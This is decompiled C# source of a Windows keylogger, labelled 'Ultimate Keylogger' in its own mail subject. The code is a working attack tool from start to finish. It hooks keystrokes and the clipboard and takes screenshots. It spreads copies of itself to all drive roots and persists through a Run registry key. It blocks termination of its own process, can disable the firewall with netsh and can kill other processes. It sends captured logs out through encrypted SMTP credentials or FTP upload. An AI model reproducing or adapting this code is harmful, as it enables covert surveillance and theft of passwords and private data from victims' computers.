using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Console_Keylogger;

public class frmMain : Form
{
	[Flags]
	private enum ProcessAccessRights
	{
		ProcessAllAccess = 0x1F0FFF
	}

	private const string toFTP = "n";

	private const string toEmail = "y";

	private const string deleteChar = "n";

	private const string screenshots = "%screenshots%";

	private const string startUpKey = "nJIJa7UQ4904o";

	private readonly IContainer components;

	private string keys = "";

	private string title = "";

	private string[] arrDisables;

	private string dups;

	private readonly Timer tmrStartUp = new Timer();

	private UserActivityHook _hooker;

	private IntPtr _nextClipboardViewer;

	protected override void Dispose(bool disposing)
	{
		try
		{
			ChangeClipboardChain(((Control)this).get_Handle(), _nextClipboardViewer);
		}
		catch
		{
		}
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(58, 58));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)this).ResumeLayout(false);
	}

	public frmMain()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		InitializeComponent();
		try
		{
		}
		catch
		{
		}
	}

	[DllImport("User32.dll")]
	protected static extern int SetClipboardViewer(int hWndNewViewer);

	[DllImport("User32.dll", CharSet = CharSet.Auto)]
	public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

	protected override void WndProc(ref Message m)
	{
		try
		{
			switch (((Message)(ref m)).get_Msg())
			{
			default:
				((Form)this).WndProc(ref m);
				break;
			case 781:
				if (((Message)(ref m)).get_WParam() == _nextClipboardViewer)
				{
					_nextClipboardViewer = ((Message)(ref m)).get_LParam();
				}
				else
				{
					SendMessage(_nextClipboardViewer, ((Message)(ref m)).get_Msg(), ((Message)(ref m)).get_WParam(), ((Message)(ref m)).get_LParam());
				}
				break;
			case 776:
				DisplayClipboardData();
				SendMessage(_nextClipboardViewer, ((Message)(ref m)).get_Msg(), ((Message)(ref m)).get_WParam(), ((Message)(ref m)).get_LParam());
				break;
			}
		}
		catch
		{
		}
	}

	private void DisplayClipboardData()
	{
		try
		{
			IDataObject dataObject = Clipboard.GetDataObject();
			if (dataObject.GetDataPresent(DataFormats.Text))
			{
				keys = keys + "[Clipboard: " + (string)dataObject.GetData(DataFormats.Text) + "]";
			}
			else
			{
				keys += "[Unknown clipboard data]";
			}
		}
		catch
		{
		}
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		//IL_012c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0136: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		try
		{
			arrDisables = "".Split(new char[1] { '.' });
			Thread.Sleep(int.Parse("1"));
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					try
					{
						File.Copy(Application.get_ExecutablePath(), string.Concat(driveInfo.RootDirectory, Path.GetFileName(Application.get_ExecutablePath())));
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			Timer val = new Timer();
			val.set_Interval(int.Parse("180000"));
			val.add_Tick((EventHandler)tmrSendLog_Tick);
			val.set_Enabled(true);
			tmrStartUp.set_Interval(1000);
			tmrStartUp.add_Tick((EventHandler)tmrStartUp_Tick);
			tmrStartUp.Start();
			ProtectProcess(AceQualifier.AccessDenied);
			if (arrDisables[0] != "")
			{
				Timer val2 = new Timer();
				val2.add_Tick((EventHandler)tmrClose_Tick);
				val2.set_Enabled(true);
			}
			_hooker = new UserActivityHook();
			_hooker.KeyDown += new KeyEventHandler(HookerKeyDown);
			_hooker.KeyPress += new KeyPressEventHandler(HookerKeyPress);
			_hooker.Start();
		}
		catch
		{
		}
	}

	private void SelfDestruct()
	{
		try
		{
			while (true)
			{
				if (DateTime.UtcNow >= DateTime.Parse("dd/mm/yyyy hh:mm:ss"))
				{
					if (tmrStartUp.get_Enabled())
					{
						tmrStartUp.set_Enabled(false);
						Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "nJIJa7UQ4904o", "");
					}
					ProtectProcess(AceQualifier.AccessAllowed);
					Process.GetCurrentProcess().Kill();
				}
				Thread.Sleep(1000);
			}
		}
		catch
		{
		}
	}

	private static void Install(string path)
	{
		try
		{
			if (!(Application.get_StartupPath() == path))
			{
				File.Copy(Application.get_ExecutablePath(), path + "\\nJIJa7UQ4904o.exe");
				Process.Start(path + "\\nJIJa7UQ4904o.exe");
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
		}
	}

	private static void tmrFirewall_tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = "netsh.exe";
			process.StartInfo.Arguments = "firewall set opmode disable";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
	}

	private void tmrClose_Tick(object sender, EventArgs e)
	{
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			string[] array = arrDisables;
			foreach (string value in array)
			{
				if (process.ProcessName.ToLower().Contains(value) && process.Id != currentProcess.Id)
				{
					try
					{
						process.Kill();
					}
					catch
					{
					}
				}
			}
		}
	}

	private static void tmrStartUp_Tick(object sender, EventArgs e)
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "nJIJa7UQ4904o", Application.get_ExecutablePath());
		}
		catch
		{
		}
	}

	private void HookerKeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		if (((object)e.get_KeyData()).ToString() == "Return")
		{
			Logger("[Enter]\\n");
		}
		if (((object)e.get_KeyData()).ToString() == "Escape")
		{
			Logger("[Escape]");
		}
	}

	private void HookerKeyPress(object sender, KeyPressEventArgs e)
	{
		if (e.get_KeyChar() == '\t')
		{
			Logger("[Tab]");
		}
		else if (!char.IsLetterOrDigit(e.get_KeyChar()) && !char.IsPunctuation(e.get_KeyChar()))
		{
			if (e.get_KeyChar() == ' ')
			{
				Logger(" ");
			}
			else if (e.get_KeyChar() == '\b')
			{
				Logger("[Delete]");
			}
			else if (e.get_KeyChar() == '=')
			{
				Logger("=");
			}
			else if (e.get_KeyChar() == '+')
			{
				Logger("+");
			}
			else if (e.get_KeyChar() == '$')
			{
				Logger("$");
			}
			else if (e.get_KeyChar() == '£')
			{
				Logger("£");
			}
			else if (e.get_KeyChar() == '<')
			{
				Logger("<");
			}
			else if (e.get_KeyChar() == '>')
			{
				Logger(">");
			}
			else if (e.get_KeyChar() == '§')
			{
				Logger("§");
			}
			else if (e.get_KeyChar() == '°')
			{
				Logger("°");
			}
			else if (e.get_KeyChar() == '²')
			{
				Logger("²");
			}
			else if (e.get_KeyChar() == '³')
			{
				Logger("³");
			}
			else if (e.get_KeyChar() == '|')
			{
				Logger("|");
			}
			else if (e.get_KeyChar() == '\u0080')
			{
				Logger("€");
			}
			else if (e.get_KeyChar() == '^')
			{
				Logger("^");
			}
			else if (e.get_KeyChar() == '\u0016')
			{
				Logger("[CTRL+V]");
			}
			else if (e.get_KeyChar() == '\u0018')
			{
				Logger("[CTRL+X]");
			}
			else if (e.get_KeyChar() == '\u0003')
			{
				Logger("[CTRL+C]");
			}
			else if (e.get_KeyChar() != '\u001b' && e.get_KeyChar() != '\r')
			{
				Logger("[Char\\" + (byte)e.get_KeyChar() + "]");
			}
		}
		else
		{
			Logger(e.get_KeyChar().ToString());
		}
	}

	private void Logger(string txt)
	{
		try
		{
			keys += txt.Replace("\\n", Environment.NewLine);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	private static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			IntPtr foregroundWindow = GetForegroundWindow();
			return (GetWindowText(foregroundWindow, stringBuilder, 256) > 0) ? stringBuilder.ToString() : null;
		}
		catch
		{
			return null;
		}
	}

	private static string UniqueCode()
	{
		try
		{
			Random random = new Random((int)DateTime.Now.Ticks);
			string text = string.Empty;
			for (int i = 0; i < random.Next(5, 40); i++)
			{
				text += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".Length)];
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private static string Decrypt(string cipherText, string passPhrase)
	{
		try
		{
			byte[] array = Convert.FromBase64String(cipherText);
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, Encoding.UTF8.GetBytes("KEnZ1yh8F"));
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CBC;
			MemoryStream memoryStream = new MemoryStream(array);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(rfc2898DeriveBytes.GetBytes(32), Encoding.UTF8.GetBytes("zu89geji340t89u2")), CryptoStreamMode.Read);
			byte[] array2 = new byte[array.Length];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
		catch
		{
			return null;
		}
	}

	private void tmrSendLog_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = Path.GetTempPath() + "\\log_" + UniqueCode() + ".txt";
			StreamWriter streamWriter = new StreamWriter(text);
			streamWriter.Write(keys);
			streamWriter.Close();
			streamWriter.Dispose();
			Thread thread = new Thread(SendMail);
			thread.Start(text);
		}
		catch
		{
		}
	}

	private static Bitmap ScreenShot()
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Expected O, but got Unknown
		try
		{
			Rectangle a = Rectangle.Empty;
			Screen[] allScreens = Screen.get_AllScreens();
			foreach (Screen val in allScreens)
			{
				a = Rectangle.Union(a, val.get_Bounds());
			}
			Bitmap val2 = new Bitmap(a.Width, a.Height, (PixelFormat)2498570);
			Graphics val3 = Graphics.FromImage((Image)(object)val2);
			val3.CopyFromScreen(a.X, a.Y, 0, 0, a.Size, (CopyPixelOperation)13369376);
			val3.Dispose();
			return val2;
		}
		catch
		{
			return null;
		}
	}

	private static void SendMail(object filePath)
	{
		try
		{
			MailAddress mailAddress = new MailAddress(Decrypt("bjVz0RvsDOi/0lSstsMRHOmCLIWY9SLFrRqzalaPRe0=", "emailaddress"));
			string subject = "Ultimate Keylogger - Log: " + DateTime.Now;
			Attachment attachment = new Attachment(filePath.ToString());
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Host = Decrypt("Xqo8KVmBez8WW73BRcVVxA==", "emailserver");
			smtpClient.Port = int.Parse(Decrypt("DwLpwjqBAPQDWOvUGkYGfQ==", "emailport"));
			smtpClient.EnableSsl = true;
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = new NetworkCredential(mailAddress.Address, Decrypt("QXJblYxNIS1YRrBF/mb+tw==", "emailpassword"));
			MailMessage mailMessage = new MailMessage(mailAddress, mailAddress);
			mailMessage.Subject = subject;
			mailMessage.Body = "Please download the attachment.";
			mailMessage.Attachments.Add(attachment);
			smtpClient.Send(mailMessage);
			mailMessage.Dispose();
			attachment.Dispose();
			File.Delete(filePath.ToString());
		}
		catch
		{
		}
	}

	private static void UploadFtp(object filePath)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(filePath.ToString());
			string requestUriString = Decrypt("%ftpServer%", "server") + "/" + Decrypt("%ftpDirectory%", "directory") + "/" + fileInfo.Name;
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(requestUriString);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(Decrypt("%ftpUsername%", "username"), Decrypt("%ftpPassword%", "password"));
			ftpWebRequest.KeepAlive = true;
			FileStream fileStream = new FileStream(filePath.ToString(), FileMode.Open);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, (int)fileStream.Length);
			fileStream.Close();
			ftpWebRequest.ContentLength = array.Length;
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			FtpWebResponse ftpWebResponse = (FtpWebResponse)ftpWebRequest.GetResponse();
			ftpWebResponse.Close();
			File.Delete(filePath.ToString());
		}
		catch
		{
		}
	}

	private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			if (_hooker.IsActive)
			{
				_hooker.Stop();
			}
		}
		catch
		{
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void ProtectProcess(AceQualifier ace)
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
			processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, ace, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			byte[] array = new byte[processSecurityDescriptor.BinaryLength];
			processSecurityDescriptor.GetBinaryForm(array, 0);
			SetKernelObjectSecurity(currentProcess, 4, array);
		}
		catch
		{
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		try
		{
			byte[] pSecurityDescriptor = new byte[0];
			GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
			if ((long)lpnLengthNeeded > 32767L)
			{
				return null;
			}
			return (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded)) ? null : new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		catch
		{
			return null;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();
}
